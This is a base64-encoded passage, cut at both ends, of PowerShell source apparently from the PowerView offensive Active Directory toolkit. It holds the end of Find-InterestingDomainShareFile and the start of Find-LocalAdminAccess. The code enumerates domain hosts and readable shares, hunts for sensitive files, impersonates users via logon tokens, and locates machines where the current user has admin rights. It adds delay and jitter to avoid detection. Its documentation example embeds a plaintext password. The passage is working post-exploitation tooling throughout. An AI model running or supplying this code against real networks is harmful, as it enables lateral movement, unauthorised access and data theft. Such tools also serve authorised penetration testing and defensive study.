DEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoIC1lcSAwKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJEluY2x1ZGUsICRFeGNsdWRlZFNoYXJlcywgJE9mZmljZURvY3MsICRFeGNsdWRlSGlkZGVuLCAkRnJlc2hFWEVzLCAkQ2hlY2tXcml0ZUFjY2VzcywgJFRva2VuSGFuZGxlKQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgIyBpbXBlcnNvbmF0ZSB0aGUgdGhlIHRva2VuIHByb2R1Y2VkIGJ5IExvZ29uVXNlcigpL0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbgogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLVRva2VuSGFuZGxlICRUb2tlbkhhbmRsZSAtUXVpZXQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKCiAgICAgICAgICAgICAgICAkU2VhcmNoU2hhcmVzID0gQCgpCiAgICAgICAgICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVyLlN0YXJ0c1dpdGgoJ1xcJykpIHsKICAgICAgICAgICAgICAgICAgICAjIGlmIGEgc2hhcmUgaXMgcGFzc2VkIGFzIHRoZSBzZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoU2hhcmVzICs9ICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBnZXQgdGhlIHNoYXJlcyBmb3IgdGhpcyBob3N0IGFuZCBkaXNwbGF5IHdoYXQgd2UgZmluZAogICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVzID0gR2V0LU5ldFNoYXJlIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVOYW1lID0gJFNoYXJlLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXRoID0gJ1xcJyskVGFyZ2V0Q29tcHV0ZXIrJ1wnKyRTaGFyZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbWFrZSBzdXJlIHdlIGdldCBhIHJlYWwgc2hhcmUgbmFtZSBiYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRTaGFyZU5hbWUpIC1hbmQgKCRTaGFyZU5hbWUuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHNraXAgdGhpcyBzaGFyZSBpZiBpdCdzIGluIHRoZSBleGNsdWRlIGxpc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEV4Y2x1ZGVkU2hhcmVzIC1Ob3RDb250YWlucyAkU2hhcmVOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgY2hlY2sgaWYgdGhlIHVzZXIgaGFzIGFjY2VzcyB0byB0aGlzIHBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gW0lPLkRpcmVjdG9yeV06OkdldEZpbGVzKCRQYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyArPSAkUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlshXSBObyBhY2Nlc3MgdG8gJFBhdGgiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFNoYXJlIGluICRTZWFyY2hTaGFyZXMpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZWFyY2hpbmcgc2hhcmU6ICRTaGFyZSIKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJncyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdQYXRoJyA9ICRTaGFyZQogICAgICAgICAgICAgICAgICAgICAgICAnSW5jbHVkZScgPSAkSW5jbHVkZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJE9mZmljZURvY3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ09mZmljZURvY3MnXSA9ICRPZmZpY2VEb2NzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkRnJlc2hFWEVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydGcmVzaEVYRXMnXSA9ICRGcmVzaEVYRXMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRMYXN0QWNjZXNzVGltZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snTGFzdEFjY2Vzc1RpbWUnXSA9ICRMYXN0QWNjZXNzVGltZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJExhc3RXcml0ZVRpbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0xhc3RXcml0ZVRpbWUnXSA9ICRMYXN0V3JpdGVUaW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkQ3JlYXRpb25UaW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydDcmVhdGlvblRpbWUnXSA9ICRDcmVhdGlvblRpbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja1dyaXRlQWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydDaGVja1dyaXRlQWNjZXNzJ10gPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBGaW5kLUludGVyZXN0aW5nRmlsZSBAU2VhcmNoQXJncwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKCiAgICAgICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkSW5jbHVkZSwgJEV4Y2x1ZGVkU2hhcmVzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0luY2x1ZGUnID0gJEluY2x1ZGUKICAgICAgICAgICAgICAgICdFeGNsdWRlZFNoYXJlcycgPSAkRXhjbHVkZWRTaGFyZXMKICAgICAgICAgICAgICAgICdPZmZpY2VEb2NzJyA9ICRPZmZpY2VEb2NzCiAgICAgICAgICAgICAgICAnRXhjbHVkZUhpZGRlbicgPSAkRXhjbHVkZUhpZGRlbgogICAgICAgICAgICAgICAgJ0ZyZXNoRVhFcycgPSAkRnJlc2hFWEVzCiAgICAgICAgICAgICAgICAnQ2hlY2tXcml0ZUFjY2VzcycgPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgJ1Rva2VuSGFuZGxlJyA9ICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24gdXNpbmcgdGhlICRIb3N0RW51bUJsb2NrICsgcGFyYW1zCiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtTG9jYWxBZG1pbkFjY2VzcyB7CjwjCi5TWU5PUFNJUwoKRmluZHMgbWFjaGluZXMgb24gdGhlIGxvY2FsIGRvbWFpbiB3aGVyZSB0aGUgY3VycmVudCB1c2VyIGhhcyBsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY2Vzcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkNvbXB1dGVyLCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYsIFRlc3QtQWRtaW5BY2Nlc3MsIE5ldy1UaHJlYWRlZEZ1bmN0aW9uICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIGFsbCBtYWNoaW5lcyBvbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4KdXNpbmcgR2V0LURvbWFpbkNvbXB1dGVyLCBhbmQgZm9yIGVhY2ggY29tcHV0ZXIgaXQgY2hlY2tzIGlmIHRoZSBjdXJyZW50IHVzZXIKaGFzIGxvY2FsIGFkbWluaXN0cmF0b3IgYWNjZXNzIHVzaW5nIFRlc3QtQWRtaW5BY2Nlc3MuIElmIC1DcmVkZW50aWFsIGlzIHBhc3NlZCwKdGhlbiBJbnZva2UtVXNlckltcGVyc29uYXRpb24gaXMgdXNlZCB0byBpbXBlcnNvbmF0ZSB0aGUgc3BlY2lmaWVkIHVzZXIKYmVmb3JlIGVudW1lcmF0aW9uLCByZXZlcnRpbmcgYWZ0ZXIgd2l0aCBJbnZva2UtUmV2ZXJ0VG9TZWxmLgoKSWRlYSBhZGFwdGVkIGZyb20gdGhlIGxvY2FsX2FkbWluX3NlYXJjaF9lbnVtIHBvc3QgbW9kdWxlIGluIE1ldGFzcGxvaXQgd3JpdHRlbiBieToKICAgICdCcmFuZG9uIE1jQ2FubiAiemVrbm94IiA8Ym1jY2FublthdF1hY2N1dmFudC5jb20+JwogICAgJ1Rob21hcyBNY0NhcnRoeSAic21pbGluZ3JhY2Nvb24iIDxzbWlsaW5ncmFjY29vblthdF1nbWFpbC5jb20+JwogICAgJ1JveWNlIERhdmlzICJyM2R5IiA8cmRhdmlzW2F0XWFjY3V2YW50LmNvbT4nCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIGNvbXB1dGVyIG9iamVjdHMuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgY29tcHV0ZXJzLAplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ2hlY2tTaGFyZUFjY2VzcwoKU3dpdGNoLiBPbmx5IGRpc3BsYXkgZm91bmQgc2hhcmVzIHRoYXQgdGhlIGxvY2FsIHVzZXIgaGFzIGFjY2VzcyB0by4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIgZm9yIGNvbXB1dGVycywgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbiBhbmQgdGFyZ2V0IHN5c3RlbXMuCgouUEFSQU1FVEVSIERlbGF5CgpTcGVjaWZpZXMgdGhlIGRlbGF5IChpbiBzZWNvbmRzKSBiZXR3ZWVuIGVudW1lcmF0aW5nIGhvc3RzLCBkZWZhdWx0cyB0byAwLgoKLlBBUkFNRVRFUiBKaXR0ZXIKClNwZWNpZmllcyB0aGUgaml0dGVyICgwLTEuMCkgdG8gYXBwbHkgdG8gYW55IHNwZWNpZmllZCAtRGVsYXksIGRlZmF1bHRzIHRvICsvLSAwLjMKCi5QQVJBTUVURVIgVGhyZWFkcwoKVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBmb3IgdXNlciBzZWFyY2hpbmcsIGRlZmF1bHRzIHRvIDIwLgoKLkVYQU1QTEUKCkZpbmQtTG9jYWxBZG1pbkFjY2VzcwoKRmluZHMgbWFjaGluZXMgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHRoZSBjdXJyZW50IHVzZXIgaGFzIGFkbWluIGFjY2VzcyB0by4KCi5FWEFNUExFCgpGaW5kLUxvY2FsQWRtaW5BY2Nlc3MgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKRmluZHMgbWFjaGluZXMgaW4gdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbiB0aGUgY3VycmVudCB1c2VyIGhhcyBhZG1pbiBhY2Nlc3MgdG8uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Mb2NhbEFkbWluQWNjZXNzIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKRmluZHMgbWFjaGluZXMgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluIHRoYXQgdGhlIHVzZXIgd2l0aCB0aGUgc3BlY2lmaWVkIC1DcmVkZW50aWFsCmhhcyBhZG1pbiBhY2Nlc3MgdG8uCgouT1VUUFVUUwoKU3RyaW5nCgpDb21wdXRlciBkbnNob3N0bmFtZXMgdGhlIGN1cnJlbnQgdXNlciBoYXMgYWRtaW5pc3RyYXRpdmUgYWNjZXNzIHRvLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ09wZXJhdGluZ1N5c3RlbScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAoKICAgICAgI